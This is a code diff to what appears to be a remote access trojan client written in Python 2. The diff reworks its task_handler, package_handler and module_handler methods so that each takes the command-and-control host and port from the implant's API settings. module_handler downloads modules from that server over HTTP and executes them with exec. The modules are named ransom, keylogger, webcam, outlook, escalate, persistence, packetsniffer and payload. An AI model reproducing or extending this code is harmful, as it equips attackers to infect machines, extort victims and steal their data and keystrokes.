@@ -1325,7 +1325,7 @@ class shell():
             util.debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
 
-    def task_handler(self, host='localhost', port=1338, task=None):
+    def task_handler(self, task=None):
         """
         Reports task results to server
         """
@@ -1336,6 +1336,8 @@ class shell():
                 except: pass
             if isinstance(task, dict):
                 try:
+                    host = self.api.get('host')
+                    port = int(self.api.get('port')) + 1
                     if self.info.get('public_ip') and self.info.get('mac_address'):
                         uid = hashlib.new('md5', ''.join(map(self.info.get, ('public_ip', 'mac_address')))).hexdigest()
                     else:
@@ -1354,33 +1356,37 @@ class shell():
             util.debug("Error: missing required argument 'task'")
 
 
-    def module_handler(self, host='localhost', port=1339, modules=['ransom', 'webcam', 'outlook', 'screenshot', 'portscan', 'escalate', 'keylogger', 'phone', 'packetsniffer', 'process', 'payload', 'persistence']):
-        """
-        directly import modules remotely 
-        """
-        imports     = {}
-        base_url    = 'http://{}:{}'.format(host, port)
-        with httpimport.remote_repo(modules, base_url=base_url):
-            for module in modules:
-                try:
-                    exec "import %s" % module in globals()
-                    imports[module] = globals().get(module)
-                except ImportError:
-                    pass
-        return imports
-
-
-    def package_handler(self, host='localhost', port=1340, packages=['numpy','Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.SHA256']):
+    def package_handler(self, packages=['numpy','Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.SHA256']):
         """
         directly import packages remotely
         """
         imports = {}
+        host     = self.api.get('host')
+        port     = int(self.api.get('port')) + 2
         base_url = 'http://{}:{}'.format(host, port)
         with httpimport.remote_repo(packages, base_url):
             for package in packages:
                 try:
                     exec "import %s" % package in globals()
                     imports[package] = globals().get(package)
+                except ImportError:
+                    pass
+        return imports
+    
+
+    def module_handler(self, modules=['ransom', 'webcam', 'outlook', 'screenshot', 'portscan', 'escalate', 'keylogger', 'phone', 'packetsniffer', 'process', 'payload', 'persistence']):
+        """
+        directly import modules remotely 
+        """
+        imports  = {}
+        host     = self.api.get('host')
+        port     = int(self.api.get('port')) + 3
+        base_url = 'http://{}:{}'.format(host, port)
+        with httpimport.remote_repo(modules, base_url):
+            for module in modules:
+                try:
+                    exec "import %s" % module in globals()
+                    imports[module] = globals().get(module)
                 except ImportError:
                     pass
         return imports
